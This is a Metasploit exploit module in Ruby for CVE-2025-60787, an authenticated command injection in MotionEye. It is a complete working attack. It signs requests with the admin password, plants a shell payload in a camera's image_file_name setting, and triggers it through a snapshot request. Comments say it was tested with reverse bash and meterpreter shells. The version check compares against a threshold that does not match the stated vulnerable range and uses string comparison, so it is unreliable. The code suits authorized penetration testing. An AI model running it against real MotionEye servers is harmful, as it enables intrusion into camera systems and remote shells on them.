##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Remote Code Execution Vulnerability in MotionEye (CVE-2025-60787)',
        'Description' => %q{
          MotionEye is vulnerable to OS Command Injection in configuration parameters such as image_file_name.
          Unsanitized user input is written to Motion configuration files,
          allowing remote authenticated attackers with admin access to achieve code execution when Motion is restarted.

          This vulnerability affects MotionEye versions <= 0.43.1b4 are vulnerable.
          Successful exploitation may result in the remote code execution under the privileges
          of the web server, potentially exposing sensitive data or disrupting survey operations.

          An attacker can execute arbitrary system commands in the context of the user running the web server.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Maksim Rogov', # Metasploit Module
          'prabhatverma47' # Vulnerability Discovery
        ],
        'References' => [
          ['CVE', '2025-60787'],
          ['URL', 'https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter']
        ],
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                # In the Docker container from the official repository, only curl is available
                'FETCH_COMMAND' => 'CURL'
              }
              # Tested with cmd/unix/reverse_bash
              # Tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'Payload' => {
          'BadChars' => '&\\'
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-09-09',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to MotionEye', '/']),
        OptString.new('USERNAME', [true, 'The username used to authenticate to MotionEye', 'admin']),
        OptString.new('PASSWORD', [true, 'The password used to authenticate to MotionEye', ''])
      ]
    )
  end

  def clean_string(data)
    signature_regex = %r{[^A-Za-z0-9/?_.=&{}\[\]":, -]}

    if data.nil?
      return ''
    elsif data.is_a?(String)
      return data.gsub(signature_regex, '-')
    elsif data.respond_to?(:to_s)
      return data.to_s.gsub(signature_regex, '-')
    end

    ''
  end

  def compute_signature(method, path, body = nil, key = '')
    parsed_uri = URI.parse(path)

    query_string = parsed_uri.query
    query_params = query_string.nil? ? {} : CGI.parse(query_string)

    sig_query = query_params.transform_values(&:first).reject { |k, _v| k == '_signature' }

    sorted_query_items = sig_query.sort_by { |k, _v| k }
    query_components = sorted_query_items.map { |k, v| "#{k}=#{CGI.escape(v)}" }

    canonical_query = query_components.join('&')
    canonical_path = parsed_uri.path
    canonical_path += "?#{canonical_query}" unless canonical_query.empty?

    cleaned_path = clean_string(canonical_path)
    cleaned_body = clean_string(body)

    if key.empty?
      # SHA1 hash of an empty string
      password_hash = 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
    else
      password_hash = Digest::SHA1.hexdigest(key).downcase
    end

    data = "#{method}:#{cleaned_path}:#{cleaned_body}:#{password_hash}"

    Digest::SHA1.hexdigest(data).downcase
  end

  def generate_timestamp_ms
    (Time.now.to_f * 1000).to_i
  end

  def send_signed_request_cgi(opts = {})
    signature_key = datastore['PASSWORD']

    method = opts['method'] || 'GET'
    base_path = opts['uri']
    body = nil

    if method.upcase == 'POST'
      if opts['data']
        body = opts['data']
      elsif opts['vars_post']
        body = URI.encode_www_form(opts['vars_post'])
      end
    end

    vars_get = {
      '_username' => datastore['USERNAME'],
      '_' => generate_timestamp_ms
    }.merge!(opts.fetch('vars_get', {}))

    query_string = URI.encode_www_form(vars_get)

    path_with_query = query_string.empty? ? base_path : "#{base_path}?#{query_string}"

    signature = compute_signature(
      method,
      path_with_query,
      body,
      signature_key
    )

    new_opts = opts.dup
    new_opts['vars_get'] = vars_get
    new_opts['vars_get']['_signature'] = signature

    return send_request_cgi(new_opts)
  end

  def add_camera
    print_status('Adding camera...')

    res = send_signed_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/config/add/'),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => {
        'scheme' => 'rtsp',
        'host' => '127.0.0.1',
        'port' => '',
        'path' => '/',
        'username' => '',
        'password' => '',
        'proto' => 'netcam',
        'camera_index' => 'tcp'
      }.to_json
    )

    begin
      json_body = JSON.parse(res.body)
    rescue JSON::ParserError
      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
    end

    unless json_body.key?('id')
      fail_with(Failure::UnexpectedReply, "#{peer} - Camera ID not found in response")
    end

    print_good('Camera successfully added')

    return json_body['id']
  end

  def set_exploit(camera_id)
    print_status('Setting up exploit...')

    res = send_signed_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/config/0/set/'),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => {
        camera_id => {
          'enabled' => true,
          'name' => 'Camera1',
          'proto' => 'netcam',
          'auto_brightness' => false,
          'rotation' => '0',
          'framerate' => '2',
          'privacy_mask' => false,
          'privacy_mask_lines' => [],
          'extra_options' => [],
          'storage_device' => 'custom-path',
          'network_server' => '',
          'network_share_name' => '',
          'network_smb_ver' => '1.0',
          'network_username' => '',
          'network_password' => '',
          'root_directory' => '/var/lib/motioneye/Camera1',
          'upload_enabled' => false,
          'upload_picture' => true,
          'upload_movie' => true,
          'upload_service' => 'ftp',
          'upload_server' => '',
          'upload_port' => '',
          'upload_method' => 'post',
          'upload_location' => '',
          'upload_subfolders' => true,
          'upload_username' => '',
          'upload_password' => '',
          'upload_authorization_key' => '',
          'upload_endpoint_url' => '',
          'upload_access_key' => '',
          'upload_secret_key' => '',
          'upload_bucket' => '',
          'clean_cloud_enabled' => false,
          'web_hook_storage_enabled' => false,
          'web_hook_storage_url' => '',
          'web_hook_storage_http_method' => 'GET',
          'command_storage_enabled' => false,
          'command_storage_exec' => '',
          'text_overlay' => true,
          'left_text' => 'camera-name',
          'custom_left_text' => '',
          'right_text' => 'timestamp',
          'custom_right_text' => '',
          'text_scale' => '1',
          'video_streaming' => true,
          'streaming_framerate' => '5',
          'streaming_quality' => '85',
          'streaming_resolution' => '100',
          'streaming_server_resize' => false,
          'streaming_port' => '9081',
          'streaming_auth_mode' => 'disabled',
          'streaming_motion' => false,
          'still_images' => true,
          'image_file_name' => "$(#{payload.encoded})",
          'image_quality' => '85',
          'capture_mode' => 'manual',
          'snapshot_interval' => '0',
          'preserve_pictures' => '0',
          'manual_snapshots' => true,
          'movies' => false,
          'movie_file_name' => '%Y-%m-%d/%H-%M-%S',
          'movie_quality' => '75',
          'movie_format' => 'mp4 => h264_v4l2m2m',
          'movie_passthrough' => false,
          'recording_mode' => 'motion-triggered',
          'max_movie_length' => '0',
          'preserve_movies' => '0',
          'motion_detection' => true,
          'frame_change_threshold' => '0.6507161458333334',
          'max_frame_change_threshold' => '0',
          'auto_threshold_tuning' => false,
          'auto_noise_detect' => true,
          'noise_level' => '13',
          'light_switch_detect' => '0',
          'despeckle_filter' => false,
          'event_gap' => '30',
          'pre_capture' => '1',
          'post_capture' => '1',
          'minimum_motion_frames' => '20',
          'motion_mask' => false,
          'motion_mask_type' => 'smart',
          'smart_mask_sluggishness' => '5',
          'motion_mask_lines' => [],
          'show_frame_changes' => false,
          'create_debug_media' => false,
          'email_notifications_enabled' => false,
          'email_notifications_from' => '',
          'email_notifications_addresses' => '',
          'email_notifications_smtp_server' => '',
          'email_notifications_smtp_port' => '',
          'email_notifications_smtp_account' => '',
          'email_notifications_smtp_password' => '',
          'email_notifications_smtp_tls' => false,
          'email_notifications_picture_time_span' => '0',
          'telegram_notifications_enabled' => false,
          'telegram_notifications_api' => '',
          'telegram_notifications_chat_id' => '',
          'telegram_notifications_picture_time_span' => '0',
          'web_hook_notifications_enabled' => false,
          'web_hook_notifications_url' => '',
          'web_hook_notifications_http_method' => 'GET',
          'web_hook_end_notifications_enabled' => false,
          'web_hook_end_notifications_url' => '',
          'web_hook_end_notifications_http_method' => 'GET',
          'command_notifications_enabled' => false,
          'command_notifications_exec' => '',
          'command_end_notifications_enabled' => false,
          'command_end_notifications_exec' => '',
          'working_schedule' => false,
          'monday_from' => '',
          'monday_to' => '',
          'tuesday_from' => '',
          'tuesday_to' => '',
          'wednesday_from' => '',
          'wednesday_to' => '',
          'thursday_from' => '',
          'thursday_to' => '',
          'friday_from' => '',
          'friday_to' => '',
          'saturday_from' => '',
          'saturday_to' => '',
          'sunday_from' => '',
          'sunday_to' => '',
          'working_schedule_type' => 'during',
          'video_controls' => {},
          'resolution' => '640x480'
        }
      }.to_json
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end

    print_good('Exploit installation completed')
  end

  def run_exploit(camera_id)
    print_status('Executing exploit...')

    res = send_signed_request_cgi(
      'uri' => normalize_uri(target_uri.path, "/action/#{camera_id}/snapshot/"),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => 'null'
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end

    print_good('Execution exploit request sent successfully')
  end

  def del_camera(camera_id)
    print_status('Removing camera')

    res = send_signed_request_cgi(
      'uri' => normalize_uri(target_uri.path, "/config/#{camera_id}/rem/"),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => 'null'
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
    end

    print_good('Camera removed successfully')
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    )

    motion_version_span = res.get_html_document.at('tr.settings-item:has(td.settings-item-label span:contains("motionEye Version")) td.settings-item-value span.settings-item-label')
    motion_version = motion_version_span&.text&.strip

    if motion_version_span.nil? || motion_version.empty?
      fail_with(Failure::UnexpectedReply, "#{peer} Failed to find motionEye version on the page")
    end

    clear_version = motion_version.gsub(/[a-zA-Z]/, '')
    if clear_version < '0.43.15'
      return CheckCode::Appears("Detected version #{clear_version}, which is vulnerable")
    end

    return CheckCode::Safe("Version #{clear_version} appears safe")
  end

  def exploit
    camera_id = add_camera
    set_exploit(camera_id)
    run_exploit(camera_id)
    del_camera(camera_id)
  end
end
